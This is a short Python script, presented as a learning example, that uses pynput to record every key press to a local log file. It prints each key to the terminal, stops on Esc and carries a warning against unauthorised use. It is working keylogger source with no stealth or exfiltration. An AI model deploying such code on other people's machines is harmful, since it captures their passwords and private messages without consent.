"""
Simple keylogger example for learning purposes.

This script listens for keyboard events and writes the keys pressed
into a log file named "key_log.txt".

Important: Use this code only on your own computer for learning.
Do not use it to capture someone else's keystrokes without permission.
"""

from pynput import keyboard

# The file where keystrokes will be saved.
LOG_FILE = "key_log.txt"


def on_press(key):
    """Called when a key is pressed."""
    try:
        # Most normal keys have a char value
        key_str = key.char
    except AttributeError:
        # Special keys like space, enter, shift, etc. use names
        key_str = f"<{key.name}>"

    # Write the key to the log file in append mode
    with open(LOG_FILE, "a", encoding="utf-8") as log_file:
        log_file.write(key_str)

    # Show a short message in the terminal so you know the program is running
    print(f"Key pressed: {key_str}")


def on_release(key):
    """Called when a key is released."""
    # Stop the listener if the Escape key is released
    if key == keyboard.Key.esc:
        print("Escape pressed, stopping listener.")
        return False


if __name__ == "__main__":
    print("Starting simple keylogger. Press Esc to stop.")
    print(f"Logging keys to {LOG_FILE}")

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
